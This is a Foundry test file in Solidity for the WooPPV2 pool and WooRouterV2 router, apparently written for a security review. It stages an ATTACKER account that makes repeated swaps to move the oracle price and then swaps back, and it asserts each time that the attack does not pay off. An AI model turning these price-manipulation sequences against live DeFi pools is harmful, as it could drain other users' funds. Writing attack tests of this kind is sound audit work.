// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import {Greeter} from "../../contracts/Greeter.sol";
import {TestHelpers} from "./TestHelpers.sol";

import {WooPPV2} from "../../contracts/WooPPV2.sol";
import {WooRouterV2} from "../../contracts/WooRouterV2.sol";
import {WooracleV2_2} from "../../contracts/wooracle/WooracleV2_2.sol";
import {MockWooOracle} from "./MockWooOracle.t.sol";
import {MockWETHOracle} from "./MockWETHOracle.t.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import "forge-std/console.sol";

contract SwapTests is TestHelpers {

    WooPPV2 public pool;
    WooRouterV2 public router;
    WooracleV2_2 public oracle;
    MockWooOracle public wooOracle;
    MockWETHOracle public wethOracle;

    address private constant ADMIN = address(1);
    address private constant ATTACKER = address(2);
    address private constant FEE_ADDR = address(4);
    
    // mainnet
    address private constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address private constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831; // QUOTE TOKEN
    address private constant WOO = 0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b; 
    address private constant USDC_USD_ORACLE = 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3; 
    address private constant ETH_USD_ORACLE = 0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612; 

    uint128 private constant MAX_NOTIONAL_USDC = 5000_000 * 1e18;
    uint128 private constant MAX_GAMMA = type(uint128).max;
    
    uint64 private constant INITIAL_SPREAD = 0.001 * 1e18;
    uint64 private constant INITIAL_COEFF = 0.000_000_0_1 * 1e18; 
    uint128 private constant INITIAL_PRICE = 320513147000;

    uint64 private constant INITIAL_SPREAD_WOO = 1e12;
    uint64 private constant INITIAL_COEFF_WOO = 0.0001 * 1e18;
    uint128 private constant INITIAL_PRICE_WOO = 1 * 1e8;

    // deployed addresses

    function setUp() public {
        vm.startPrank(ADMIN);
        pool = new WooPPV2(USDC);
        router = new WooRouterV2(WETH, address(pool));
        oracle = new WooracleV2_2();
        wethOracle = new MockWETHOracle();

        oracle.setQuoteToken(USDC, USDC_USD_ORACLE);
        oracle.setCLOracle(WETH, address(wethOracle), true);
        oracle.setWooPP(address(pool));

        oracle.postState(WETH, INITIAL_PRICE, INITIAL_SPREAD, INITIAL_COEFF);
        oracle.setGuardian(ADMIN, true);
        oracle.setRange(WETH, 1 * 1e8, 4000 * 1e8);
        oracle.setAdmin(address(pool), true);

        pool.setWooracle(address(oracle));
        pool.setTokenInfo(WETH, 0, MAX_GAMMA, MAX_NOTIONAL_USDC);
        pool.setFeeAddr(FEE_ADDR);
        vm.stopPrank();
    }

    // run this command to run the test:
    // forge test --fork-url https://arb1.arbitrum.io/rpc --match-contract SwapTests -vv
    function test_Exploit() public {
        // bootstrap the pool 
        uint256 usdcAmount = 1e9 * 1e18;
        deal(USDC, ADMIN, usdcAmount);
        deal(WETH, ADMIN, usdcAmount);
        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WETH).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WETH);
        vm.stopPrank();
        ////////////////////////

        // fund mr ATTACKER
        vm.startPrank(ATTACKER);
        uint wethAmountForATTACKER = 80 * 1e18;
        deal(WETH, ATTACKER, wethAmountForATTACKER * 100);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();
        ////////////////////////
        
        // get the price before the swaps
        (uint256 price, ) = oracle.price(WETH);
        console.log("Price before the swap", price);

        console.log("Decimal info for WETH:", pool.decimalInfo(WETH).priceDec, pool.decimalInfo(WETH).baseDec, pool.decimalInfo(WETH).quoteDec);

        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves
        // partial swaps in same tx will also work and it will be even more profitable! 
        uint cumulative;
        for (uint i; i < 3; ++i) {
            vm.prank(ATTACKER);
            cumulative += router.swap(WETH, USDC, wethAmountForATTACKER, 0, payable(ATTACKER), ATTACKER);
            console.log("price, spread: ", oracle.woState(WETH).price, oracle.woState(WETH).spread);
        }

        // how much we bought and what's the final swap? 
        console.log("Received USDC after swaps", cumulative);
        (price, ) = oracle.price(WETH);
        console.log("Price after swap", price);
        console.log("state: ", oracle.woState(WETH).price, oracle.woState(WETH).spread);

        // sell cumulative USDC, how much WETH we get?
        vm.prank(ATTACKER);
        uint receivedWETH = router.swap(USDC, WETH, cumulative, 0, payable(ATTACKER), ATTACKER);
        console.log("Received WETH after swaps", receivedWETH);
        (price, ) = oracle.price(WETH);
        console.log("Price after swap", price);
        console.log("state: ", oracle.woState(WETH).price, oracle.woState(WETH).spread);

        // attack is unsuccesfull 
        assertGe(wethAmountForATTACKER * 3, receivedWETH);
    }

    function test_Exploit2() public {
        // bootstrap the pool 
        uint256 usdcAmount = 1e9 * 1e18;
        deal(USDC, ADMIN, usdcAmount);
        deal(WETH, ADMIN, usdcAmount);
        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WETH).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WETH);
        vm.stopPrank();
        ////////////////////////

        // fund mr ATTACKER
        vm.startPrank(ATTACKER);
        uint wethAmountForATTACKER = 40 * 1e18;
        deal(WETH, ATTACKER, wethAmountForATTACKER * 100);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();
        ////////////////////////
        
        // get the price before the swaps
        (uint256 price, ) = oracle.price(WETH);
        console.log("Price before the swap", price);

        console.log("Decimal info for WETH:", pool.decimalInfo(WETH).priceDec, pool.decimalInfo(WETH).baseDec, pool.decimalInfo(WETH).quoteDec);

        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves
        // partial swaps in same tx will also work and it will be even more profitable! 
        uint cumulative;
        for (uint i; i < 6; ++i) {
            vm.prank(ATTACKER);
            cumulative += router.swap(WETH, USDC, wethAmountForATTACKER, 0, payable(ATTACKER), ATTACKER);
            console.log("price, spread: ", oracle.woState(WETH).price, oracle.woState(WETH).spread);
        }

        // how much we bought and what's the final swap? 
        console.log("Received USDC after swaps", cumulative);
        (price, ) = oracle.price(WETH);
        console.log("Price after swap", price);
        console.log("state: ", oracle.woState(WETH).price, oracle.woState(WETH).spread);

        // sell cumulative USDC, everytime sell 100 usdc, how much WETH we get?
        uint receivedWETH;
        while (cumulative > 0) {
            uint amount = 100 * 1e6;
            if (amount > cumulative) {
                amount = cumulative;
            }
            cumulative -= amount;

            vm.prank(ATTACKER);
            receivedWETH += router.swap(USDC, WETH, amount, 0, payable(ATTACKER), ATTACKER);
            // console.log("Received WETH", receivedWETH);
            // console.log("state: ", oracle.woState(WETH).price, oracle.woState(WETH).spread);
        }

        console.log("Received WETH", receivedWETH);
        (price, ) = oracle.price(WETH);
        console.log("Price after swap", price);
        console.log("state: ", oracle.woState(WETH).price, oracle.woState(WETH).spread);

        // attack is unsuccesfull 
        assertGe(wethAmountForATTACKER * 6, receivedWETH);
    }
}